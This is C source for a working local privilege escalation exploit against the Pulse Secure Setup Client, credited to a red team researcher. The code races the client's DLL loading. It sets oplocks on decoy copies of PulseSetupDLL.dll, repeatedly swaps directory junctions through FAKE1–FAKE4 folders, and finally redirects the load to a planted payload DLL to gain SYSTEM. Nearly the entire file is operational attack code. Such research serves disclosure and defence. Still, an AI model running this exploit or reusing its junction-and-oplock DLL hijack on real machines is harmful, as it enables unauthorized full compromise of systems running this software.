#include <windows.h>
#include <winbase.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>
#include <pathcch.h>
#include <Shlwapi.h>
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Shlwapi.lib")
#include "FileOpLock.h" 
#include "stdafx.h"

// This is Pulse Secure Setup Client race condition LPE exploit.
// Developed by Julian Horoszkiewicz (Eviden Red Team).
// Code based on https://learn.microsoft.com/en-us/windows/win32/fileio/obtaining-directory-change-notifications
// and https://learn.microsoft.com/en-us/windows/win32/fileio/listing-the-files-in-a-directory, 
// FileOplock code taken from Google's https://github.com/googleprojectzero/symboliclink-testing-tools

void backup_original(LPSTR);
void deploy_payload(LPTSTR);

void handle_oplock_fake();
void watch_for_poc();
void deploy_payload();
void restore_original();
void remove_pulse_directory();
void set_oplock(LPWSTR);

HANDLE hFind = INVALID_HANDLE_VALUE;
HANDLE h_toRename = INVALID_HANDLE_VALUE;
TCHAR LOCALAPPDATA[MAX_PATH];
TCHAR PULSE_TEMP_DIRNAME[MAX_PATH];

TCHAR NEXT_DIR[MAX_PATH];
TCHAR OPLOCK_TARGET[MAX_PATH];

TCHAR PAYLOAD_DLL_PATH[MAX_PATH];
TCHAR DLL_PATH[MAX_PATH];
TCHAR PULSE_TEMP_BACKUP[MAX_PATH];
TCHAR DLL_COPY_PATH[MAX_PATH];
TCHAR DLL_FAKE1_FILE[MAX_PATH];
TCHAR DLL_FAKE2_FILE[MAX_PATH];
TCHAR DLL_FAKE3_FILE[MAX_PATH];
TCHAR DLL_FAKE4_FILE[MAX_PATH];
TCHAR DLL_ROGUE_FILE[MAX_PATH];
TCHAR DLL_FAKE1_PATH[MAX_PATH];
TCHAR DLL_FAKE2_PATH[MAX_PATH];
TCHAR DLL_FAKE3_PATH[MAX_PATH];
TCHAR DLL_FAKE4_PATH[MAX_PATH];
TCHAR DLL_ROGUE_PATH[MAX_PATH];

TCHAR CURRENT_DIR[MAX_PATH];
TCHAR POC_PATH[MAX_PATH];
TCHAR CHILD_PROC_COMMAND_LINE[MAX_PATH];
WIN32_FIND_DATA ffd;
DWORD dwError = 0;
// Find the first file in the directory.
TCHAR FIRST_TEMP_FILENAME[MAX_PATH];
TCHAR FIRST_TEMP_FILEMASK[MAX_PATH];

char* DLL_BUFFER;
size_t DLL_BUFF_LENGTH = 0;
int MAX_SCAN_FAILS = 20;
static FileOpLock* oplock = nullptr;

int create_hardlink(LPCWSTR existing, LPCWSTR hardlink) // runs 
{
    // Write - Host "Creating the junction to the copy of the original dir.."
    //    cmd.exe / c 'mklink /J "Setup Client" "Setup Client2"'
    // we must wait for the process to exit, otherwise we will run into race conditions with ourselves
    TCHAR cmdline[MAX_PATH];
    StringCchCopy(cmdline, MAX_PATH, TEXT("/c mklink /J "));
    StringCchCat(cmdline, MAX_PATH, TEXT("\""));
    StringCchCat(cmdline, MAX_PATH, hardlink);
    StringCchCat(cmdline, MAX_PATH, TEXT("\" "));
    StringCchCat(cmdline, MAX_PATH, TEXT("\""));
    StringCchCat(cmdline, MAX_PATH, existing);
    StringCchCat(cmdline, MAX_PATH, TEXT("\""));
    _tprintf(TEXT("Running cmd.exe %s\n"), cmdline);
    DWORD child_PID = 0;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    TCHAR MOD_NAME[MAX_PATH];
    StringCchCopy(MOD_NAME, MAX_PATH, TEXT("C:\\Windows\\System32\\cmd.exe"));
    HANDLE ch_Handle = INVALID_HANDLE_VALUE;
    // Start the child process. 
    if (!CreateProcess(MOD_NAME,   // No module name (use command line)
        cmdline,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d). Exiting!\n", GetLastError());
        restore_original();
        ExitProcess(1);
    }
    WaitForSingleObject(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId),INFINITE); // this process should never hang
    //printf("Done.\n"); // this is redundant as mklink provides clear output
    return 1;
}

int set_oplock_fake() // share modes: r - FILE_SHARE_READ, w - FILE_SHARE_WRITE, d - FILE_SHARE_DELETE, x - Exclusive lock
{
    //StringCchCat(OPLOCK_TARGET, MAX_PATH, target);
    _tprintf(TEXT("Trying to set an oplock on %s...\n"), OPLOCK_TARGET);
    oplock = FileOpLock::CreateLock(OPLOCK_TARGET, TEXT("w"), handle_oplock_fake);
    if (oplock != nullptr)
    {
        _tprintf(TEXT("Oplock on %s set, waiting for release...\n"), OPLOCK_TARGET);
        oplock->WaitForLock(INFINITE);
        delete oplock;
        return 0;
    }
    else
    {
        printf("Error creating oplock 2.\n");
        return 1;
    }
}
void handle_oplock_fake()
{
    printf("OpLock triggered!\n");    
    _tprintf(TEXT("Replacing %s with hardlink to %s\n"), PULSE_TEMP_DIRNAME, NEXT_DIR);
    remove_pulse_directory(); // remove the current directory junction
    create_hardlink(NEXT_DIR, PULSE_TEMP_DIRNAME);
}

void remove_pulse_directory()
{    
   // before creating new directory junction the old one must be removed
   // "RemoveDirectory removes a directory junction, even if the contents of the target are not empty; the function removes directory junctions regardless of the state of the target object."
   // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-removedirectorya
    if (RemoveDirectory(PULSE_TEMP_DIRNAME) == 0)  // exactly what we need 
    {
        _tprintf(TEXT("ERROR: Failed to remove the junction %s, this will make hardlink creation fail!\n"), PULSE_TEMP_DIRNAME);
        if (PathFileExists(PULSE_TEMP_DIRNAME))
        {
            _tprintf(TEXT("ERROR: Apparently in fact %s still exist, why?\n"), PULSE_TEMP_DIRNAME);
        }
    }
}
void init_variables()
{
    GetEnvironmentVariable(TEXT("APPDATA"), LOCALAPPDATA, MAX_PATH); // C:\Users\user\AppData\Local\Temp is what we're looking for    
    StringCchCat(DLL_COPY_PATH, MAX_PATH, LOCALAPPDATA); // backup copy
    StringCchCat(PULSE_TEMP_DIRNAME, MAX_PATH, LOCALAPPDATA);
    StringCchCat(PULSE_TEMP_BACKUP, MAX_PATH, LOCALAPPDATA);
    StringCchCat(PULSE_TEMP_BACKUP, MAX_PATH, TEXT("\\Pulse Secure\\Setup Client Backup"));
    StringCchCat(DLL_FAKE1_PATH, MAX_PATH, LOCALAPPDATA);
    StringCchCat(DLL_FAKE2_PATH, MAX_PATH, LOCALAPPDATA);
    StringCchCat(DLL_FAKE3_PATH, MAX_PATH, LOCALAPPDATA);
    StringCchCat(DLL_FAKE4_PATH, MAX_PATH, LOCALAPPDATA);
    StringCchCat(DLL_ROGUE_PATH, MAX_PATH, LOCALAPPDATA);
    StringCchCat(PULSE_TEMP_DIRNAME, MAX_PATH, TEXT("\\Pulse Secure\\Setup Client"));
    StringCchCat(DLL_PATH, MAX_PATH, PULSE_TEMP_DIRNAME);
    StringCchCat(POC_PATH, MAX_PATH, TEXT("C:\\Users\\Public\\poc.txt")); // poc.txt expected to be created upon successful DLL hijack
    StringCchCat(DLL_PATH, MAX_PATH, TEXT("\\PulseSetupDLL.dll")); // PulseSetupDLL.dll, original
    StringCchCat(DLL_FAKE1_PATH, MAX_PATH, TEXT("\\Pulse Secure\\FAKE1"));
    StringCchCat(DLL_FAKE2_PATH, MAX_PATH, TEXT("\\Pulse Secure\\FAKE2"));
    StringCchCat(DLL_FAKE3_PATH, MAX_PATH, TEXT("\\Pulse Secure\\FAKE3"));
    StringCchCat(DLL_FAKE4_PATH, MAX_PATH, TEXT("\\Pulse Secure\\FAKE4"));
    StringCchCat(DLL_ROGUE_PATH, MAX_PATH, TEXT("\\Pulse Secure\\ROGUE"));

    StringCchCat(DLL_FAKE1_FILE, MAX_PATH, DLL_FAKE1_PATH);
    StringCchCat(DLL_FAKE2_FILE, MAX_PATH, DLL_FAKE2_PATH);
    StringCchCat(DLL_FAKE3_FILE, MAX_PATH, DLL_FAKE3_PATH);
    StringCchCat(DLL_FAKE4_FILE, MAX_PATH, DLL_FAKE4_PATH);
    StringCchCat(DLL_ROGUE_FILE, MAX_PATH, DLL_ROGUE_PATH);
    StringCchCat(DLL_FAKE1_FILE, MAX_PATH, TEXT("\\PulseSetupDLL.dll")); // original, redirected
    StringCchCat(DLL_FAKE2_FILE, MAX_PATH, TEXT("\\PulseSetupDLL.dll")); // original, redirected
    StringCchCat(DLL_ROGUE_FILE, MAX_PATH, TEXT("\\PulseSetupDLL.dll")); // malicious, redirected
    StringCchCat(DLL_COPY_PATH, MAX_PATH, TEXT("\\PulseSetupDLL.bak.dll")); // 
}
void init_payload()
{
    // OK, load the payload DLL now
    size_t path_len = 0;
    GetModuleFileName(NULL, CURRENT_DIR, MAX_PATH);
    StringCchLengthW(CURRENT_DIR, MAX_PATH, &path_len);
    PathCchRemoveFileSpec(CURRENT_DIR, path_len);
    StringCchCat(PAYLOAD_DLL_PATH, MAX_PATH, CURRENT_DIR);
    StringCchCat(PAYLOAD_DLL_PATH, MAX_PATH, TEXT("\\raw.dll"));

    // Open the binary file
    HANDLE fileHandle = CreateFile(PAYLOAD_DLL_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("\nFailed to open %s DLL file for reading!\n"), PAYLOAD_DLL_PATH);
        restore_original();
        ExitProcess(1);
        return;
    }
    // Get the file size
    DLL_BUFF_LENGTH = GetFileSize(fileHandle, NULL);
    // Read the file contents into a buffer
    DLL_BUFFER = new char[DLL_BUFF_LENGTH];
    DWORD bytesRead;
    if (!ReadFile(fileHandle, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesRead, NULL)) {
        _tprintf(TEXT("\nFailed to read the payload DLL file!\n"));
        delete[] DLL_BUFFER;
        CloseHandle(fileHandle);
        restore_original();
        ExitProcess(1);
        return;
    }
    _tprintf(TEXT("Done (%d bytes of DLL file read, file size and DLL_BUFFER size: %d).\n"), bytesRead, DLL_BUFF_LENGTH);
}
void set_or_restore_fake1() // this does the opposite to restore_original()
{
    if (PathFileExists(DLL_FAKE1_PATH))
    {
        _tprintf(TEXT("Detected %s from a previous run.\n"), DLL_FAKE1_PATH); // means it was moved and not restored properly
        _tprintf(TEXT("Creating hardlink %s -> %s.\n"), PULSE_TEMP_DIRNAME, DLL_FAKE1_PATH);
        if (!PathFileExists(PULSE_TEMP_DIRNAME))
        {      
            _tprintf(TEXT("%s not present.\n"), PULSE_TEMP_DIRNAME);
            
            if (!create_hardlink(DLL_FAKE1_PATH, PULSE_TEMP_DIRNAME)) // moved the original Setup Client directory to FAKE1 and replaced it with a hardlink
            {
                printf("Hardlink creation failed! Exiting!\n");
                ExitProcess(1);
            }
        }
        else
        {
            _tprintf(TEXT("%s found.\n"), PULSE_TEMP_DIRNAME);
            MoveFile(PULSE_TEMP_DIRNAME, PULSE_TEMP_BACKUP); // try to move the redundant Setup Client directory away (could be as well removed recursively)
            if (!create_hardlink(DLL_FAKE1_PATH, PULSE_TEMP_DIRNAME)) // moved the original Setup Client directory to FAKE1 and replaced it with a hardlink
            {
                printf("Hardlink creation failed! Exiting!\n");
                ExitProcess(1);
            }
        }
        printf("Hardlink created.\n");
    }
    else
    {
        if (!PathFileExists(PULSE_TEMP_DIRNAME))
        {
            _tprintf(TEXT("\n%s could not be found either, exiting!\n"), PULSE_TEMP_DIRNAME);
            ExitProcess(1);
        }
        _tprintf(TEXT("Moving %s from %s\n."), PULSE_TEMP_DIRNAME, DLL_FAKE1_PATH);
        if (MoveFile(PULSE_TEMP_DIRNAME, DLL_FAKE1_PATH) == 0) // Move "Setup Client" to "FAKE1"        
        {
            _tprintf(TEXT("\nCould not restore %s by moving %s. Exiting!!\n"), DLL_FAKE1_PATH, PULSE_TEMP_DIRNAME);
            ExitProcess(1);
        } 
        _tprintf(TEXT("Done, creating hardlink %s -> %s\n"), PULSE_TEMP_DIRNAME, DLL_FAKE1_PATH);        
        if (!create_hardlink(DLL_FAKE1_PATH, PULSE_TEMP_DIRNAME)) // moved the original Setup Client directory to FAKE1 and replaced it with a hardlink
        {
            printf("Hardlink creation failed! Exiting!\n");
            ExitProcess(1);
        }
    }
}
void restore_original() // this does the opposive of set_or_restore_fake1()
{
    printf("Restoring the original DLL...\n");
    // rename "FAKE1" back to "Setup Client"

    if (!RemoveDirectory(PULSE_TEMP_DIRNAME)) // remove the hardlink
    {
        _tprintf(TEXT("\nCould not remove %s hardlink. Exiting!!\n"), PULSE_TEMP_DIRNAME);
        ExitProcess(1);
    }
    if (!MoveFile(DLL_FAKE1_PATH, PULSE_TEMP_DIRNAME)) // move back "FAKE1" to "Setup Client"
    {
        _tprintf(TEXT("\nCould not move back %s to %s. Exiting!!\n"), DLL_FAKE1_PATH, PULSE_TEMP_DIRNAME);
        ExitProcess(1);
    }
}
void init_files()
{
    _tprintf(TEXT("Running backup and cleanup [PID: %d] ...\n"), GetCurrentProcessId());
    if (PathFileExists(POC_PATH))
    {
        _tprintf(TEXT("Detected old %s, removing.\n"), POC_PATH);
        DeleteFile(POC_PATH);
    }
    // Backup the original file if not backed up already
    if (!PathFileExists(DLL_COPY_PATH))
    {
        if (!PathFileExists(DLL_PATH))
        {
            set_or_restore_fake1(); // move FAKE1 back to Setup Client
            
            if (!PathFileExists(DLL_PATH))
            {
                _tprintf(TEXT("%s backup did not exist, and neither does %s and could not restore from %s. You need to restore directory structure manually, PulseSetupDLL.dll from somewhere (MD5: ab4f0e3387f1e2971b616d926603d7f8, try VT!). Exiting.\n"), DLL_COPY_PATH, DLL_PATH, DLL_FAKE1_PATH);                
                ExitProcess(1);
            }
            else
            {
                _tprintf(TEXT("%s backup did not exist, and neither does %s - successfully restored from %s. Y\n"), DLL_COPY_PATH, DLL_PATH, DLL_FAKE1_PATH);
            }                        
        }
        else
        {
            _tprintf(TEXT("%s backup did not exist, created from %s.\n"), DLL_PATH);
            CopyFile(DLL_PATH, DLL_COPY_PATH, FALSE);
        }
    }
    else
    {
        _tprintf(TEXT("%s backup exists.\n"), DLL_COPY_PATH);
        if (!PathFileExists(DLL_PATH))
        {
            _tprintf(TEXT("%s does not exist, restorting from %s...\n"), DLL_PATH, DLL_COPY_PATH);
            CopyFile(DLL_COPY_PATH, DLL_PATH, FALSE);
        }
    }

    // check if original directory exists, move it to FAKE1
    // make sure there is a legitimate copy at FAKE1 and FAKE2
    // make sure there is malicious DLL in ROGUE

    // 1. make sure DLL_FAKE1_PATH exists and contains the original copy of the PulseSetupDLL.dll (it is the original "Setup Client" dir we move)
    // 2. make sure DLL_FAKE2_PATH exists and contains the original copy of the PulseSetupDLL.dll (created and copied there by us)
    // 3. deploy_payload() to DLL_ROGUE_PATH
    // 4. make sure DLL_PULSE_TEMP path is a hardlink to FAKE1
    // 5. start exploitation
    
    set_or_restore_fake1(); // FAKE1 handled

    // now handle FAKE2-4
    if (!PathFileExists(DLL_FAKE2_FILE))
    {
        if (CreateDirectory(DLL_FAKE2_PATH, NULL))
        {
            _tprintf(TEXT("Created  %s.\n"), DLL_FAKE2_PATH);
        }
        else

        {
            _tprintf(TEXT("Could not create directory: %s.\n"), DLL_FAKE2_PATH);
            restore_original();
            ExitProcess(1);
        }
        CopyFile(DLL_PATH, DLL_FAKE2_FILE,TRUE);
        _tprintf(TEXT("Deployed %s.\n"), DLL_FAKE2_FILE);
    }
    if (!PathFileExists(DLL_FAKE3_FILE))
    {
        if (CreateDirectory(DLL_FAKE3_PATH, NULL))
        {
            _tprintf(TEXT("Created  %s.\n"), DLL_FAKE3_PATH);
        }
        else

        {
            _tprintf(TEXT("Could not create directory: %s.\n"), DLL_FAKE3_PATH);
            restore_original();
            ExitProcess(1);
        }
        CopyFile(DLL_PATH, DLL_FAKE3_FILE, TRUE);
        _tprintf(TEXT("Deployed %s.\n"), DLL_FAKE3_FILE);
    }
    if (!PathFileExists(DLL_FAKE4_FILE))
    {
        if (CreateDirectory(DLL_FAKE4_PATH, NULL))
        {
            _tprintf(TEXT("Created  %s.\n"), DLL_FAKE4_PATH);
        }
        else

        {
            _tprintf(TEXT("Could not create directory: %s.\n"), DLL_FAKE4_PATH);
            restore_original();
            ExitProcess(1);
        }
        CopyFile(DLL_PATH, DLL_FAKE4_FILE, TRUE);
        _tprintf(TEXT("Deployed %s.\n"), DLL_FAKE4_FILE);
    }
    // OK, now deploy our payload INTO ROGUE\PulseSetupDLL.dll
    init_payload();
    deploy_payload();
}
void start_oplock_process(LPCWSTR target_dir, LPCWSTR  next_dir) // so, our processes will start with the following command line: dir nextdir
{
    StringCchCopy(CHILD_PROC_COMMAND_LINE, MAX_PATH, target_dir);
    StringCchCat(CHILD_PROC_COMMAND_LINE, MAX_PATH, TEXT(" "));
    StringCchCat(CHILD_PROC_COMMAND_LINE, MAX_PATH, next_dir);
    DWORD child_PID = 0;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    TCHAR MOD_NAME[MAX_PATH];
    GetModuleFileName(NULL, MOD_NAME, MAX_PATH);
    HANDLE ch_Handle = INVALID_HANDLE_VALUE;
    // Start the child process. 
    if (!CreateProcess(MOD_NAME,   // No module name (use command line)
        CHILD_PROC_COMMAND_LINE,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d). Exiting!\n", GetLastError());
        restore_original();
        ExitProcess(1);
    }
    else
    {
        printf("Process created successfully.\n");
        //child_PID = pi.dwProcessId;
        //ch_Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, child_PID);
        //return ch_Handle;
        //WaitForSingleObject(ch_Handle, 30000);
        // kill the child process if still exists
        //TerminateProcess(ch_Handle, 1);
    }
}

void _tmain(int argc, TCHAR *argv[])
{
    //
    //return;
    init_variables(); // initate paths
    if (argc == 2) // if we are run as a subprocess to start an oplock
    {
        // we are expecting two arguments here:
        // 0 - oplock target directory, e.g. FAKE1
        // 1 - next directory to redirect the hardlink once oplock is hit, e.g. FAKE2 or ROGUE
        // && _tcscmp(argv[0], TEXT("OPLOCK")) > 0
              
        _tprintf(TEXT("Child process started, next directory: %s.\n"), argv[1]);
        //HANDLE child_proc = start_oplock_process(argv[1]);
        // argv0 - oplock target (just the directory name)
        // argv1 - next directory

        StringCchCopy(OPLOCK_TARGET, MAX_PATH, LOCALAPPDATA);
        StringCchCat(OPLOCK_TARGET, MAX_PATH, TEXT("\\Pulse Secure\\"));
        StringCchCat(OPLOCK_TARGET, MAX_PATH, argv[0]); // directory name from argv0
        StringCchCat(OPLOCK_TARGET, MAX_PATH, TEXT("\\PulseSetupDLL.dll"));

        StringCchCopy(NEXT_DIR, MAX_PATH, LOCALAPPDATA);
        StringCchCat(NEXT_DIR, MAX_PATH, TEXT("\\Pulse Secure\\"));
        StringCchCat(NEXT_DIR, MAX_PATH, argv[1]); // directory name from argv1

        //_tprintf(TEXT("argv[0]: %s\nargv[1]: %s\n"), argv[0], argv[1]);
        _tprintf(TEXT("running set_oplock_fake with the following args:\noplock target: %s\nnext dir: %s\n"), OPLOCK_TARGET, NEXT_DIR);
        // this is where our execution dies and WerFault is run...
        set_oplock_fake(); //  if we are here, our sole goal is to set up an oplock on the next directory's DLL file and then link it to "Setup Client" (junction)
        // for some reason this parameter is not passed properly
        _tprintf(TEXT("Oplock process %s %s exiting.\n"),argv[0], argv[1]);
        ExitProcess(1);
        return;
    }
    init_files(); // cleanup, backup, initial hardlink setup (making sure directory is a hardlink to FAKE1 when we start)
    _tprintf(TEXT("\nFile structures initialized.\nPress any key to start TOCTOU exploitation, then trigger the Setup Client by connecting to a proper instance of Pulse Secure Gateway.\n"));
    char g;
    getc(stdin);
  
    // run several child processes, each locking a different file:
    // 1 - oplock
    // 2 - oplock
    // 3 - oplock
    // 4 - oplock
    //start_oplock_process(DLL_FAKE1_FILE, DLL_FAKE2_PATH);
    //start_oplock_process(DLL_FAKE2_FILE, DLL_FAKE3_PATH);   
    //start_oplock_process(DLL_FAKE3_FILE, DLL_ROGUE_PATH);
    start_oplock_process(TEXT("FAKE1"), TEXT("FAKE2"));
    start_oplock_process(TEXT("FAKE2"), TEXT("FAKE3"));
    start_oplock_process(TEXT("FAKE3"), TEXT("FAKE4"));
    start_oplock_process(TEXT("FAKE4"), TEXT("ROGUE"));
    // this is what we have right now
    
    //set_oplock_final(DLL_FAKE1_FILE, TEXT("w")); // first read oplock
    watch_for_poc(); //    
    // Waiting 30 more seconds for the child process to end, then exiting.\n");    

    /**/
    // at this point we can kill the child process if still exists
    // 1. first, run the second oplock child process; that's right, in the opposite order to execution, oplock FAKE2\PulseSetupDLL.dll
    //    this second's oplock contains last hardlink switch, which will point to a copy of raw.dll,
    //    move the poc-watcher into this code, after oplock is released
    // 2. run the first oplock (no child process needed), set the first oplock on the DLL 
    // start first thread that will set an oplock on the first legit copy of PulseSetupDLL.exe (FAKE1 directory)
    //   its handler routine will just change the hardlink, that's it (-> FAKE2 directory), release the oplock
    //   now, start a second process that will set an oplock on the second PulseSetupDLL.dll (FAKE2) and wait until that succeeds (e.g. there is FAKE2.txt file in the directory)
    //   release the oplock
}
void deploy_payload() // deploy our payload into FAKE2\PulseSetupDLL.dll, this file will be redected to by a dir hardlink
{  
    // DLL_ROGUE_PATH
    if (!PathFileExists(DLL_ROGUE_PATH) && !CreateDirectory(DLL_ROGUE_PATH, NULL))
    {
        _tprintf(TEXT("%s not present and could not create, exiting...\n"), DLL_ROGUE_PATH);
    }
    HANDLE outFile = CreateFile(DLL_ROGUE_FILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        
    if(outFile == INVALID_HANDLE_VALUE)
    {
            _tprintf(TEXT("Failed to write the %s file!\n"), DLL_ROGUE_FILE);
    }
    // Write binary data to the file
    DWORD bytesWritten;
    if (!WriteFile(outFile, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesWritten, NULL))
    {
            _tprintf(TEXT("[FATAL]: Failed to write into %s file!"), DLL_ROGUE_FILE);
            restore_original();
            ExitProcess(1);
            CloseHandle(outFile);
    }
    else
    {
            CloseHandle(outFile);
            _tprintf(TEXT("File %s created (%d bytes written)!\n"), DLL_ROGUE_FILE, bytesWritten);
    }
}

void watch_for_poc()
{
    int WAIT_FOR = 120;
    int i = 0;
    _tprintf(TEXT("Will wait indefinitely and keep checking if our DLL got loaded.\n"), POC_PATH);
    for(i=0;i<WAIT_FOR;i++)
    {
        Sleep(1000);
        if (PathFileExists(POC_PATH))
        {
            printf("\n\n\nGOT SYSTEM BABY!\n\n\ntype C:\\Users\\Public\\poc.txt\n");
            restore_original();
        }
    }
}
